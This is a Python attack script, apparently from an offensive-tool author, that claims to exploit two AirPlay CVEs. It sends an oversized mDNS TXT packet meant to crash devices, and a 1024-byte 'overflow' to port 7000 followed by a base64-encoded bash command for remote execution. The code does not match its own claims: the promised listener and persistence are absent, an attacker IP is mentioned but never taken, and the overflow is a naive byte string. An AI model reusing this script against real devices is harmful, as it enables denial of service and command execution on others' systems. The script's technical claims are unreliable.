#!/usr/bin/env python3
# AirBorne Elite Edition — Full RCE with Listener & Persistence
# Created by ekomsSavior | Team EVA Forever
# Powered by cybersword.tech

import socket
import base64
import argparse
import subprocess
import threading
import time
import os
from scapy.all import *

def print_banner():
    print(r"""
  ___  _________________  ___________ _   _  _____  
 / _ \|_   _| ___ \ ___ \|  _  | ___ \ \ | ||  ___| 
/ /_\ \ | | | |_/ / |_/ /| | | | |_/ /  \| || |__   
|  _  | | | |    /| ___ \| | | |    /| . ` ||  __|  
| | | |_| |_| |\ \| |_/ /\ \_/ / |\ \| |\  || |___  
\_| |_/\___/\_| \_\____/  \___/\_| \_\_| \_/\____/ 

 CVE-2025-24252 & CVE-2025-24132 PoC + RCE + ONLY Shell Command Injection
    """)

# --- Payload Generators ---
def generate_payload(command):
    encoded = base64.b64encode(command.encode()).decode()
    return f"echo {encoded} | base64 -d | bash".encode()

# --- CVE-2025-24252 (mDNS crash) ---
def exploit_24252(interface):
    print("[*] Launching CVE-2025-24252 (mDNS TXT Crash)...")
    packet = IP(dst="224.0.0.251") / UDP(sport=5353, dport=5353) / DNS(
        qr=0,
        opcode=0,
        qdcount=1,
        ancount=1,
        qd=DNSQR(qname="AirPlay._tcp.local", qtype="PTR"),
        an=DNSRR(rrname="AirPlay._tcp.local", type="TXT", rdata="A" * 5000)
    )
    send(packet, iface=interface, count=1)
    print("[+] mDNS crash packet sent on interface:", interface)

# --- CVE-2025-24132 (Heap Overflow + Reverse Shell) ---
def exploit_24132(target_ip, command):
    print(f"[*] Launching CVE-2025-24132 (Heap Overflow + RCE)...")

    try:
        sock = socket.create_connection((target_ip, 7000), timeout=5)
        overflow = b"A" * 1024
        payload = generate_payload(command)
        full_payload = overflow + b"\n" + payload + b"\n"
        sock.sendall(full_payload)
        sock.close()
        print("[+] Payload delivered. Check your shell.")
    except Exception as e:
        print("[-] Exploit failed:", e)

# --- CLI Setup ---
def main():
    print_banner()

    parser = argparse.ArgumentParser(description="AirBorne Elite PoC Exploit Tool")
    parser.add_argument("--exploit", required=True, choices=["24252", "24132"], help="Which CVE to run")
    parser.add_argument("--interface", help="Interface for CVE-24252")
    parser.add_argument("--target", help="Target IP (for CVE-24132)")
    parser.add_argument("--command", help="Custom command for bash payload (if using bash_own_command)")

    args = parser.parse_args()

    if args.exploit == "24252":
        if not args.interface:
            print("[-] Interface is required for mDNS attack.")
            return
        exploit_24252(args.interface)

    elif args.exploit == "24132":
        if not args.target:
            print("[-] Target and attacker IP required.")
            return
        exploit_24132(args.target, args.command)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
